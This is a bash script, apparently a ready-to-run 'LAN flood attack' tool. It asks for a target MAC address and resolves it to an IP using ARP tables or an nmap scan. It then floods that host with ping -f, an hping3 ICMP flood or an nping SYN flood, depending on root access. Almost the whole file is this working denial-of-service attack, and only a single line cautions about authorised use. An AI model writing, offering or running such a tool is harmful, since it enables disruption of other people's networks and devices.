#!/bin/bash

# ANSI Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Check root
if [[ $EUID -ne 0 ]]; then
    echo -e "${YELLOW}[!] Running without root. Limited to ping flood.${NC}"
    ROOT_MODE=false
else
    echo -e "${GREEN}[✓] Root access. Advanced attacks enabled.${NC}"
    ROOT_MODE=true
fi

# Validate MAC
validate_mac() {
    [[ "$1" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] && return 0 || return 1
}

# Validate IP
validate_ip() {
    [[ "$1" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]] && return 0 || return 1
}

# Get default interface
get_interface() {
    ip route get 8.8.8.8 | awk '{print $5; exit}'
}

# Resolve IP from MAC
resolve_ip() {
    local mac="$1"
    echo -e "${BLUE}[*] Resolving IP for MAC: $mac...${NC}"

    # Try `ip neigh`
    ip=$(ip neigh | grep -i "$mac" | awk '{print $1}')
    [[ -n "$ip" ]] && echo -e "${GREEN}[✓] Found IP: $ip (via ip neigh)${NC}" && echo "$ip" && return 0

    # Try `arp -a` (cross-platform)
    ip=$(arp -a | grep -i "$mac" | awk '{print $2}' | tr -d '()')
    [[ -n "$ip" ]] && echo -e "${GREEN}[✓] Found IP: $ip (via arp -a)${NC}" && echo "$ip" && return 0

    # Try `nmap -sn` (root-only)
    if [[ "$ROOT_MODE" = true ]]; then
        echo -e "${BLUE}[*] Scanning with nmap...${NC}"
        subnet=$(ip route | grep -oP '(\d+\.\d+\.\d+\.\d+/\d+)' | head -1)
        ip=$(nmap -sn "$subnet" | grep -i -B 2 "$mac" | awk '/Nmap scan/{print $5}')
        [[ -n "$ip" ]] && echo -e "${GREEN}[✓] Found IP: $ip (via nmap)${NC}" && echo "$ip" && return 0
    fi

    echo -e "${RED}[-] Failed to resolve IP.${NC}"
    return 1
}

# Ping flood (no root)
ping_flood() {
    echo -e "${YELLOW}[*] Starting PING FLOOD (Press Ctrl+C to stop)...${NC}"
    ping -f -c 100000 "$1" 2>&1 | grep --color=always "bytes from"
}

# Advanced flood (root)
advanced_flood() {
    if command -v hping3 &> /dev/null; then
        echo -e "${RED}[*] Launching hping3 ICMP flood...${NC}"
        hping3 --flood --icmp "$1"
    elif command -v nping &> /dev/null; then
        echo -e "${RED}[*] Launching nping SYN flood...${NC}"
        nping --tcp --flags SYN --rate 1000 "$1"
    else
        echo -e "${YELLOW}[!] Falling back to ping flood.${NC}"
        ping_flood "$1"
    fi
}

# Main
echo -e "${CYAN}\n==== LAN FLOOD ATTACK ====${NC}"
echo -e "${YELLOW}Use only on authorized networks!${NC}\n"

# Get target MAC
while true; do
    read -p "Enter target MAC (XX:XX:XX:XX:XX:XX): " mac
    validate_mac "$mac" && break || echo -e "${RED}[-] Invalid MAC format.${NC}"
done

# Resolve IP
ip=$(resolve_ip "$mac")
if [[ -z "$ip" ]]; then
    echo -e "${YELLOW}[!] Could not resolve IP.${NC}"
    read -p "Enter target IP manually: " ip
    while ! validate_ip "$ip"; do
        echo -e "${RED}[-] Invalid IP format.${NC}"
        read -p "Enter target IP manually: " ip
    done
fi

# Confirm attack
echo -e "\n${RED}[!] TARGET: $ip (MAC: $mac)${NC}"
read -p "Start attack? (y/n): " confirm
if [[ "$confirm" =~ ^[Yy]$ ]]; then
    if [[ "$ROOT_MODE" = true ]]; then
        advanced_flood "$ip"
    else
        ping_flood "$ip"
    fi
else
    echo -e "${GREEN}[✓] Attack canceled.${NC}"
fi
